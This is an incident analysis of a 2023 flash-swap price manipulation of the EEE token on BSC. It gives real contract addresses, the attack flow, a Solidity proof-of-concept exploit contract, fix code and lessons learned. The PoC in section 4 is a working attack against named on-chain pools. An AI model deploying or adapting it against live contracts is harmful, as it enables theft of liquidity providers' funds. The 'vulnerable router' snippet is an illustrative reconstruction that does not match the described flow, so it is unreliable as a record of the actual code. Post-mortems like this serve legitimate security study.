# EEE Flash Loan Price Manipulation Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | EEE Token |
| Date | 2023-11-08 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$22,800 USD |
| Attack Type | Flash Swap + LP Imbalance + Repeated Router Swap |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Attacker Address | `0xb06d402705ad5156b42e4279903cbd7771cf59c9` |
| Attack Contract | `0x9a16b5375e79e409a8bfdb17cfe568e533c2d7c5` |
| Vulnerable Contract | `0x0506e571ABa3dD4C9d71bEd479A4e6d40d95C833` (EEE/USDT LP) |
| Fork Block | 33,940,983 |

## 2. Vulnerability Code Analysis

The EEE token ecosystem's swap router (`0x5002F2D9Ac1763F9cF02551B3A72a42E792AE9Ea`) had a flawed pricing model that preferentially returned a disproportionate amount of EEE after a large USDT inflow. The attacker borrowed USDT via a PancakeSwap flash swap, injected it directly into the EEE/USDT LP to create a reserve imbalance, then purchased EEE at a deflated price through the vulnerable router and sold it back for USDT to realize profit.

```solidity
// Vulnerable pattern: EEE swap router returning abnormal price
contract EEESwapRouter {
    address public cake_LP;

    // Vulnerable: incorrect price calculation under LP imbalance
    function swap(address token, uint256 amount) external {
        // Reserve ratio skewed by direct USDT injection into LP
        uint256 eeeAmount = calculateEEE(amount); // Returns more EEE than actual value
        IERC20(EEE).transfer(msg.sender, eeeAmount);
    }
}
```

**Vulnerability**: The EEE swap router failed to accurately reflect the LP's real-time reserves, allowing EEE to be purchased at a severely deflated price when large amounts of USDT were injected directly into the LP.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Swap + LP Imbalance + Repeated Router Swap
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xb06d402705ad5156b42e4279903cbd7771cf59c9]
  │
  ├─1─▶ PancakeSwap.swap(750,000 USDT, 0, address(this), "0x00")
  │      [Pancake Pool: 0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0]
  │      Flash swap to borrow USDT → triggers pancakeCall
  │
  ├─2─▶ USDT.transfer(cake_LP, amount)
  │      [EEE/USDT LP: 0x0506e571ABa3dD4C9d71bEd479A4e6d40d95C833]
  │      Direct USDT injection into LP → creates reserve imbalance
  │
  ├─3─▶ cake_LP.swap(EEE 52,000,000, 0, address(this), "")
  │      Direct EEE extraction from LP (exploiting reserve imbalance)
  │
  ├─4─▶ EEE.approve(swap_router, max)
  │      [swap_router: 0x5002F2D9Ac1763F9cF02551B3A72a42E792AE9Ea]
  │
  ├─5─▶ Repeated router swaps (9 rounds):
  │      swap_router.swap(EEE, 3,000,000e18)  ← initial large swap
  │      for (i=0; i<8; i++):
  │          swap_router.swap(EEE, 800,000e18)  ← repeated smaller swaps
  │      Excess USDT obtained through vulnerable router
  │
  ├─6─▶ EEE.transfer(cake_LP, remaining EEE)
  │      Return remaining EEE to LP
  │
  ├─7─▶ cake_LP.swap(0, 188,300 USDT, address(this), "")
  │      Recover additional USDT
  │
  └─8─▶ Repay PancakeSwap flash swap (751,950 USDT) + realize ~$22,800 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IAttackRouter {
    function swap(address token, uint256 amount) external;
}

contract EEEExploit {
    IPancakePool pancake = IPancakePool(0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0);
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address cake_LP = 0x0506e571ABa3dD4C9d71bEd479A4e6d40d95C833;
    address EEE = 0x297f3996Ce5C2Dcd033c77098ca9e1acc3c3C3Ee;
    address swap_router = 0x5002F2D9Ac1763F9cF02551B3A72a42E792AE9Ea;

    function testExploit() external {
        pancake.swap(750_000_000_000_000_000_000_000, 0, address(this), "0x00");
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // Inject USDT directly into EEE/USDT LP
        usdt.transfer(cake_LP, amount0);

        // Extract EEE directly from LP under reserve imbalance
        uint256 EEE_amount = 52_000_000_000_000_000_000_000_000;
        IPancakePool(cake_LP).swap(EEE_amount, 0, address(this), "");

        // Repeated EEE → USDT swaps through vulnerable router
        IERC20(EEE).approve(swap_router, type(uint256).max);
        IAttackRouter(swap_router).swap(EEE, 3_000_000_000_000_000_000_000_000);
        for (uint8 i = 0; i < 8; i++) {
            IAttackRouter(swap_router).swap(EEE, 800_000_000_000_000_000_000_000);
        }

        // Return remaining EEE and recover additional USDT
        IERC20(EEE).transfer(cake_LP, IERC20(EEE).balanceOf(address(this)));
        IPancakePool(cake_LP).swap(0, 188_300_000_000_000_000_000_000, address(this), "");

        // Repay flash swap
        usdt.transfer(0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0, 751_950_000_000_000_000_000_000);
    }

    fallback() external payable {}
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | Flawed swap router price calculation + LP reserve manipulation |
| Impact Scope | EEE/USDT PancakeSwap LP |
| Explorer | [BSCscan](https://bscscan.com/address/0x0506e571ABa3dD4C9d71bEd479A4e6d40d95C833) |

## 6. Security Recommendations

```solidity
// Fix 1: Add slippage protection to the swap router
function swap(address token, uint256 amountIn) external {
    uint256 expectedOut = getAmountOut(amountIn);
    uint256 minOut = expectedOut * 99 / 100; // 1% slippage
    uint256 actualOut = _executeSwap(token, amountIn);
    require(actualOut >= minOut, "Slippage too high");
}

// Fix 2: Use TWAP instead of spot price based on LP reserves
function getAmountOut(uint256 amountIn) internal view returns (uint256) {
    // Use 30-minute TWAP instead of instantaneous reserves
    return twapOracle.getAmountOut(amountIn, 1800);
}

// Fix 3: Limit large swaps within a single transaction
uint256 public maxSwapPercent = 100; // 1% of LP reserves

function swap(address token, uint256 amount) external {
    (uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();
    require(amount <= uint256(reserve0) * maxSwapPercent / 10000, "Swap too large");
    // ...
}
```

## 7. Lessons Learned

1. **Custom Swap Router Risk**: Protocols that use a custom router instead of the standard PancakeSwap router must independently audit the security of their price calculation logic. Pricing models that deviate from the standard AMM formula carry a high risk of manipulation.
2. **Direct LP Injection Attack**: Transferring tokens directly to an LP contract creates a discrepancy between the actual balance and the stored `reserve` without calling `sync()`. If a custom router reads `balanceOf` directly, this discrepancy can be exploited.
3. **Repeated Swap Pattern**: The 9-round repeated swap accumulates small arbitrage profits with each iteration. Repeated small swaps can incur less slippage and yield greater profit than a single large swap.
4. **Custom Routers in Small BSC Tokens**: When small-cap tokens on BSC implement their own swap routers, failing to correctly implement the standard AMM formula introduces exactly this type of vulnerability.